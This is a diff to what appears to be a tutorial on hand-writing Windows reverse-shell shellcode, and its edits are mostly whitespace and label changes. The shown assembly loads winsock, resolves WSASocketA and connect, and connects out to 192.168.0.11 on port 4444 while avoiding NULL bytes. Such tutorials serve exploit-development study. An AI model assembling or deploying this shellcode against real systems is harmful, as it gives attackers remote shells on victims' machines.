@@ -294,7 +294,7 @@ struct sockaddr_in {
 `sockaddr` is somewhat like a polymorphism where the actual type of structure to be used migh vary. In our case we want to use `sockaddr_in`, which is the specific structure for TCP connections. In short, we must push the IP in hex format, then the port and finally the family.
 
 ~~~
-; Call connect
+.callConnect
 	;set up sockaddr_in
 	mov ebx, 0x1c11b9d1	;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.0.11)
 	sub ebx, 0x11111111	;subtract from ebx to obtain the real IP
@@ -328,9 +328,9 @@ _start:
 	xor eax, eax
 
 	mov ax, 0x3233			;23
-	push eax				;includes \0 at the end without insert NULLs
+	push eax			;includes \0 at the end without insert NULLs
 	push 0x5f327377 		;_2sw
-	push esp			    ;pointer to the string
+	push esp			;pointer to the string
 
 	mov ebx, 0x7c801d7b		;addr of LoadLibraryA (0x7c801d7b)
 	call ebx
@@ -340,15 +340,15 @@ _start:
 .getWSAStartup:
 	xor eax, eax
 
-	mov ax, 0x7075          ;'up'
+	mov ax, 0x7075          	;'up'
 	push eax
-	push 0x74726174         ;'trat'
-	push 0x53415357         ;'SASW'
-	push esp	            ;pointer to the string
+	push 0x74726174         	;'trat'
+	push 0x53415357         	;'SASW'
+	push esp	            	;pointer to the string
 
-	push ebp	            ;winsock handler
+	push ebp	            	;winsock handler
 	
-	mov ebx, 0x7c80ae40     ;addr of GetProcAddress
+	mov ebx, 0x7c80ae40     	;addr of GetProcAddress
 	call ebx
 
 .callWSAStartUp:
@@ -366,24 +366,24 @@ _start:
 .getWSASocketA:
 	xor eax, eax
 
-	mov ax, 0x4174          ;'At'
+	mov ax, 0x4174          	;'At'
 	push eax
-	push 0x656b636f         ;'ekco'
-	push 0x53415357         ;'SASW'
-	push esp	            ;pointer to the string
+	push 0x656b636f         	;'ekco'
+	push 0x53415357         	;'SASW'
+	push esp	            	;pointer to the string
 
-	push ebp	            ;socket handler
+	push ebp	           	;socket handler
 	
-	mov ebx, 0x7c80ae40     ;addr of GetProcAddress
+	mov ebx, 0x7c80ae40     	;addr of GetProcAddress
 	call ebx
 
 .callWSASocketA:
-	xor ebx, ebx		    ;clear ebx
+	xor ebx, ebx		    	;clear ebx
 	push ebx;		        ;dwFlags=NULL
 	push ebx;		        ;g=NULL
 	push ebx;		        ;lpProtocolInfo=NULL
 	
-	xor ecx, ecx		    ;clear ecx
+	xor ecx, ecx		    	;clear ecx
 	mov cl, 0x6		        ;protocol=6
 	push ecx
 
@@ -395,28 +395,28 @@ _start:
 	call eax		        ;call WSASocketA
 
 	push eax		        ;save eax in edx
-	pop edi			
+	pop edi
 
 .getConnect:
 	xor eax, eax
 
-	mov eax, 0x74636590     ;'\x90tce'
+	mov eax, 0x74636590     	;'\x90tce'
 	shr eax, 8
 	push eax
-	push 0x6e6e6f63         ;'nnoc'
-	push esp	            ;pointer to the string
+	push 0x6e6e6f63         	;'nnoc'
+	push esp	            	;pointer to the string
 
-	push ebp	            ;socket handler
+	push ebp	            	;socket handler
 	
-	mov ebx, 0x7c80ae40     ;addr of GetProcAddress
+	mov ebx, 0x7c80ae40     	;addr of GetProcAddress
 	call ebx
 
-; Call connect
+.callConnect
 	;set up sockaddr_in
-	mov ebx, 0x1c11b9d1	    ;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.0.11)
-	sub ebx, 0x11111111	    ;subtract from ebx to obtain the real IP
-	push ebx		        ;push sin_addr
-	push word 0x5c11	    ;0x115c = (port 4444)
+	mov ebx, 0x1c11b9d1		;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.0.11)
+	sub ebx, 0x11111111		;subtract from ebx to obtain the real IP
+	push ebx			;push sin_addr
+	push word 0x5c11		;0x115c = (port 4444)
 
 	xor ebx, ebx
 	mov bl, 2
